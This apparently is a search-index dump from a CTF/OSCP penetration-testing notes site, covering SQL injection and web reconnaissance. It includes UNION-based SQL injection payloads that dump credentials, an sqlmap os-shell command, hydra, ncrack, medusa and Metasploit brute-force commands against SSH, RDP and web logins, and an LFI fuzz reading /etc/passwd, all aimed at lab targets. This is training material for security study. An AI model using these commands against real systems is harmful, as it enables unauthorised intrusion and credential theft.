GROUP_CONCAT(Username,\":\",Password),2,3,4,5,6 FROM Staff.Users-- - Copy<h3>Search results </h3>ID: admin:856f5de590ef37314e7c3bdf6f8a66dc<br/>Name: 2 3<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/> "},{"title":"os shell","type":1,"pageTitle":"SQL Injectionsqlmap#INFORMATION_SCHEMA#Manual Methods#","url":"docs/web/sql_injection#os-shell","content":"Copysqlmap -u \"http://testphp.vulnweb.com/listproducts.php?cat=1\" --os-shell INFORMATION_SCHEMA# Refs: https://www.cmi.ac.in/~madhavan/courses/databases10/mysql-5.0-reference-manual/information-schema.html#schemata-table INFORMATION_SCHEMA provides access to database metadata. Metadata is data about the data, such as the name of a database or table, the data type of a column, or access privileges. INFORMATION_SCHEMA is the information database, the place that stores information about all the other databases that the MySQL server maintains. Inside INFORMATION_SCHEMA there are several read-only tables. They are actually views, not base tables, so there are no files associated with them. "},{"title":"current database","type":1,"pageTitle":"SQL Injectionsqlmap#INFORMATION_SCHEMA#Manual Methods#","url":"docs/web/sql_injection#current-database","content":"Copysearch=killer' UNION SELECT database(),2,3,4,5,6-- - Copy<h3>Search results </h3> ID: Staff<br/>Name: 2 3<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/> "},{"title":"using INFORMATION_SCHEMA","type":1,"pageTitle":"SQL Injectionsqlmap#INFORMATION_SCHEMA#Manual Methods#","url":"docs/web/sql_injection#using-information_schema","content":"Copysearch=killer' UNION SELECT SCHEMA_NAME,2,3,4,5,6 FROM INFORMATION_SCHEMA.SCHEMATA-- - Copy<h3>Search results </h3> ID: information_schema<br/>Name: 2 3<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/><br/>ID: Staff<br/>Name: 2 3<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/><br/>ID: users<br/>Name: 2 3<br/>Position: 4<br />Phone No: 5<br />Email:6<br/> "},{"title":"all databases","type":1,"pageTitle":"SQL Injectionsqlmap#INFORMATION_SCHEMA#Manual Methods#","url":"docs/web/sql_injection#all-databases","content":"Copysearch=killer' UNION SELECT GROUP_CONCAT(SCHEMA_NAME),2,3,4,5,6 FROM INFORMATION_SCHEMA.SCHEMATA-- - Copy<h3>Search results </h3>ID: information_schema,Staff,users<br/>Name: 2 3<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/> "},{"title":"Web ReconBasic Scanning#Directory Listing#Authentication#Header Fuzzing and Manipulation#","type":0,"sectionRef":"#","url":"docs/web/web_recon","content":""},{"title":"nmap","type":1,"pageTitle":"Web ReconBasic Scanning#Directory Listing#Authentication#Header Fuzzing and Manipulation#","url":"docs/web/web_recon#nmap","content":"https://github.com/jai-the-seeker/CTF-OSCP/blob/master/utilities/nmap.md#basic-scans "},{"title":"curl","type":1,"pageTitle":"Web ReconBasic Scanning#Directory Listing#Authentication#Header Fuzzing and Manipulation#","url":"docs/web/web_recon#curl","content":"https://github.com/jai-the-seeker/CTF-OSCP/blob/master/utilities/curl.md#http-response-headers Directory Listing# "},{"title":"Metasploit","type":1,"pageTitle":"Web ReconBasic Scanning#Directory Listing#Authentication#Header Fuzzing and Manipulation#","url":"docs/web/web_recon#metasploit","content":"Copy# bruteforce on web server directories and list the names of directories found using msfconsoleuse auxiliary/scanner/http/brute_dirs "},{"title":"Dirb","type":1,"pageTitle":"Web ReconBasic Scanning#Directory Listing#Authentication#Header Fuzzing and Manipulation#","url":"docs/web/web_recon#dirb","content":"Copy# DIRB IS a Web Content Scanner. It looks for existing (and/or hidden) Web Objects. It basically works by# launching a dictionary basesd attack against a web server and analizing the response.# Note: Please remember to remove the preceding ‘/’ from each of directory name entry (in the# directory.txt). Without this change, dirb won’t work.dirb http://192.166.161.3 directory.txt "},{"title":"Using curl and bash script","type":1,"pageTitle":"Web ReconBasic Scanning#Directory Listing#Authentication#Header Fuzzing and Manipulation#","url":"docs/web/web_recon#using-curl-and-bash-script","content":"We can use curl to check for all the directories listed in the wordlist. This can be done by a following wrapper bash script https://github.com/jai-the-seeker/CTF-OSCP/blob/master/scripts/bash_scripts.md#directory-listing Authentication# "},{"title":"Basic authentication","type":1,"pageTitle":"Web ReconBasic Scanning#Directory Listing#Authentication#Header Fuzzing and Manipulation#","url":"docs/web/web_recon#basic-authentication","content":""},{"title":"Digest Authentication","type":1,"pageTitle":"Web ReconBasic Scanning#Directory Listing#Authentication#Header Fuzzing and Manipulation#","url":"docs/web/web_recon#digest-authentication","content":"https://github.com/jai-the-seeker/CTF-OSCP/blob/master/utilities/curl.md#digest-authentication "},{"title":"Token Authentication","type":1,"pageTitle":"Web ReconBasic Scanning#Directory Listing#Authentication#Header Fuzzing and Manipulation#","url":"docs/web/web_recon#token-authentication","content":"Hydra and metasploit http_login module doesn’t support token authentication. We have to set the token in headers for token auth to work. Copycurl -H 'Authorization: Token <token>' 192.183.171.3 We have to write a custom wrapper around this command. In the script, we will rely on the fact that on using the correct token, we will get something else than \"Unauthorized Access\". You can refer this script https://github.com/jai-the-seeker/CTF-OSCP/blob/master/scripts/bash_scripts.md#authorization-token After performing the dictionary attack we will get the password, which can be used to set the token in the headers Copy# -H, --header <header/@file> Pass custom header(s) to servercurl -H 'Authorization: Token 123123123' 192.186.248.3 "},{"title":"Hydra","type":1,"pageTitle":"Web ReconBasic Scanning#Directory Listing#Authentication#Header Fuzzing and Manipulation#","url":"docs/web/web_recon#hydra","content":""},{"title":"ncrack","type":1,"pageTitle":"Web ReconBasic Scanning#Directory Listing#Authentication#Header Fuzzing and Manipulation#","url":"docs/web/web_recon#ncrack","content":"Refs: https://tools.kali.org/password-attacks/ncrackhttps://nmap.org/ncrack/man.html Use verbose mode (-v), read a list of IP addresses (-iL win.txt), and attempt to login with the username victim (--user victim) along with the passwords in a dictionary (-P passes.txt) using the RDP protocol (-p rdp) with a one connection at a time (CL=1): Copyroot@kali:~# ncrack -v -iL win.txt --user victim -P passes.txt -p rdp CL=1 "},{"title":"medusa","type":1,"pageTitle":"Web ReconBasic Scanning#Directory Listing#Authentication#Header Fuzzing and Manipulation#","url":"docs/web/web_recon#medusa","content":""},{"title":"Fetch Header","type":1,"pageTitle":"Web ReconBasic Scanning#Directory Listing#Authentication#Header Fuzzing and Manipulation#","url":"docs/web/web_recon#fetch-header","content":"Copy# curl -I to fetch headers and read the protection type from those headerscurl -I http://192.165.34.3/dir# msfconsoleuse auxiliary/scanner/http/http_header "},{"title":"wfuzz","type":1,"pageTitle":"Web ReconBasic Scanning#Directory Listing#Authentication#Header Fuzzing and Manipulation#","url":"docs/web/web_recon#wfuzz","content":"Official Website https://wfuzz.readthedocs.io/en/latest/user/basicusage.html#fuzzing-paths-and-files There are two db wordlists associated with wfuzz which can be obtained from https://code.google.com/p/fuzzdb/https://github.com/danielmiessler/SecLists "},{"title":"curl","type":1,"pageTitle":"Web ReconBasic Scanning#Directory Listing#Authentication#Header Fuzzing and Manipulation#","url":"docs/web/web_recon#curl-1","content":"https://github.com/jai-the-seeker/CTF-OSCP/blob/master/utilities/curl.md#http-basic-authentication "},{"title":"metasploit","type":1,"pageTitle":"Web ReconBasic Scanning#Directory Listing#Authentication#Header Fuzzing and Manipulation#","url":"docs/web/web_recon#metasploit-1","content":"http_login module Copyuse auxiliary/scanner/http/http_loginset RHOSTS 192.165.34.3set USER_FILE /tmp/usersset PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txtset VERBOSE falseset AUTH_URI /poc/exploit "},{"title":"http-get","type":1,"pageTitle":"Web ReconBasic Scanning#Directory Listing#Authentication#Header Fuzzing and Manipulation#","url":"docs/web/web_recon#http-get","content":"Copyhydra -L unix_users.txt -P passwords.txt 192.148.69.3 http-get / Options : -l single LOGIN name or -L FILE having list of LOGIN names, -p single PASSWORD or -P FILE having list of passwords, -t Number of threads per target (default: 16) "},{"title":"http-post-form","type":1,"pageTitle":"Web ReconBasic Scanning#Directory Listing#Authentication#Header Fuzzing and Manipulation#","url":"docs/web/web_recon#http-post-form","content":"Ref https://redteamtutorials.com/2018/10/25/hydra-brute-force-https/https://www.youtube.com/watch?v=fFnEdoCyVhk&list=PLYmlEoSHldN7HJapyiQ8kFLUsk_a7EjCw&index=63 syntax Copyhydra -L <USER> -P <Password> <IP Address> http-post-form \"<Login Page>:<Request Body>:<Error Message>\" Example: Copyhydra -L usernames.txt -P passwords.txt 192.168.2.62 http-post-form \"/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login Failed\" "},{"title":"ssh","type":1,"pageTitle":"Web ReconBasic Scanning#Directory Listing#Authentication#Header Fuzzing and Manipulation#","url":"docs/web/web_recon#ssh","content":"Copyhydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.1.123 -t 4 "},{"title":"ssh","type":1,"pageTitle":"Web ReconBasic Scanning#Directory Listing#Authentication#Header Fuzzing and Manipulation#","url":"docs/web/web_recon#ssh-1","content":"Copyncrack -v -U username -P passwords CL=1 10.10.10.109:22ORncrack -v -U username -P passwords CL=1 ssh://10.10.10.109ORncrack -v -U username -P passwords CL=1 -p ssh 10.10.10.109 "},{"title":"ssh","type":1,"pageTitle":"Web ReconBasic Scanning#Directory Listing#Authentication#Header Fuzzing and Manipulation#","url":"docs/web/web_recon#ssh-2","content":"Ref https://www.youtube.com/watch?v=j0RjKrON8yI&list=PLPp1uf5KO-28BELlZoFyKNGDaMKZrriOr&index=74 Copymedusa -h 192.168.1.102 -u msfadmin -P customwordlist.txt -M ssh -n 22 -h : target hostname, -u : username, -P : a dictionary file, -M : the module to execute like SSH, FTP etc, -n : port number wrt to module Header Fuzzing and Manipulation# "},{"title":"Fuzzing User Agent String","type":1,"pageTitle":"Web ReconBasic Scanning#Directory Listing#Authentication#Header Fuzzing and Manipulation#","url":"docs/web/web_recon#fuzzing-user-agent-string","content":"We can use wfuzz to check for various valid strings of the User-Agent by passing it a wordlist containing possible user agents strings. The word list can of user-agents can be obtained from https://github.com/fuzzdb-project/fuzzdb/blob/master/discovery/UserAgent/UserAgentListCommon.txt Copywfuzz -c -z file,user-agent.txt -H \"User-Agent: FUZZ\" http://192.8.221.3/secret output Copy 000001: C=200 1 L 2 W 39 Ch \"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6\"000002: C=403 1 L 2 W 15 Ch \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\" Here response code of 200 indicates that the user-agent-string is valid. The same can now be used with curl to verify and access the webpage Copycurl -H \"User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6\" 192.8.221.3/secret "},{"title":"Fuzzing Missing Header","type":1,"pageTitle":"Web ReconBasic Scanning#Directory Listing#Authentication#Header Fuzzing and Manipulation#","url":"docs/web/web_recon#fuzzing-missing-header","content":"Refs: https://rootflag.io/hack-the-box-control/ In case we see some message like Access Denied : Header Missing, it seems that it's expecting a certain header parameter. We can use wfuzz to try and determine what it might be looking for. So we can create a list of all the HTTP header responses from here. So we have some header types to fuzz now we just need our target. We were given a hint earlier that we had some files stored on a 192.168.4.28 address. We can generate a list of every IP in that scope and use that. This is what our total command will look like: Command: Copywfuzz -c -w http-headers-fuzz.txt -w ip-192-168-4-0.txt --hs \"Header Missing\" --sc \"200\" -H \"FUZZ:FUZ2Z\" \"http://10.10.10.167/admin.php\" A quick breakdown of the above command: -c will output with colors, I like colors. -w specifies a wordlist. --hs will hide responses of the type following it. In this case \"Header Missing\". --sc will show response codes of the type following it. In this case 200. -H specifies header parameters. FUZZ:FUZ2Z These are the two header parameters we are fuzzing. FUZZ is for the first wordlist specified. FUZ2Z is for the second word list specified. So we have something like this in the header of our request: \"Acces-Control-Allow-Origin:192.168.4.44\" http://10.10.10.167/admin.php Lastly, the target URL. "},{"title":"Fuzzing Parameter for LFI","type":1,"pageTitle":"Web ReconBasic Scanning#Directory Listing#Authentication#Header Fuzzing and Manipulation#","url":"docs/web/web_recon#fuzzing-parameter-for-lfi","content":"Wordlist: https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt Copywfuzz -b 'PHPSESSID=asli2tadgik6dr33077orjr7oh' --hw 100 -c -w ~/Downloads/burp-parameter-names.txt http://10.10.10.109/manage.php?FUZZ=../../../../../../../../../../../../etc/passwd Here, --hw 100 will hide responses with number of words less than 100, -b is for specifying the cookie for the request "}]